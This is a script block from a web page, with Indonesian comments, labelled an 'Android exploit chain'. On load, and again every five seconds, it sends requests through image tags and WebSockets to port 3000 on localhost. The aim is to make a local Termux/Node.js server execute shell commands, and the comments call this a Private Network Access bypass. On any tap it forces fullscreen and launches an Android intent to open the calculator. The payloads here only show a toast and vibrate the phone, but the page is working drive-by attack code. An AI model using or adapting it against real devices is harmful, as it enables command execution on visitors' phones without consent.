    <script>

        // Payload Android: Mencoba membuka kalkulator via Intent (Deep Link)
        const androidIntent = "intent://#Intent;package=com.google.android.calculator;scheme=android-app;end";
        
        // Payload untuk server Node.js (jika target adalah termux yang menjalankan server)
        const termuxPayload = "termux-toast 'SYSTEM COMPROMISED' && termux-vibrate -d 500";

        async function inject() {
            const targets = ["127.0.0.1", "localhost"];

            targets.forEach(ip => {
                log(`Scanning internal port 3000 on ${ip}...`);

                // 1. PNA Bypass via Image (HTTP GET)
                // Mengirim perintah ke server lokal (misal server Node.js di Termux)
                new Image().src = `http://${ip}:3000/exec?cmd=${encodeURIComponent(termuxPayload)}`;

                // 2. WebSocket Attack
                try {
                    const ws = new WebSocket(`ws://${ip}:3000`);
                    ws.onopen = () => {
                        log(`[!] WS CONNECTED on ${ip}: Executing vibrate...`);
                        ws.send(termuxPayload);
                    };
                } catch(e){}
            });
        }

        // Fitur khusus Android: Paksa Fullscreen saat user berinteraksi
        window.onclick = () => {
            document.documentElement.requestFullscreen();
            log("Attempting Intent Injection...");
            // Mencoba membuka aplikasi kalkulator secara paksa
            window.location.href = androidIntent;
        };

        window.onload = () => {
            log("Starting Android exploit chain...");
            log("TAP ANYWHERE TO TRIGGER FULLSCREEN & INTENT");
            inject();
            setInterval(inject, 5000);
        };
    </script>
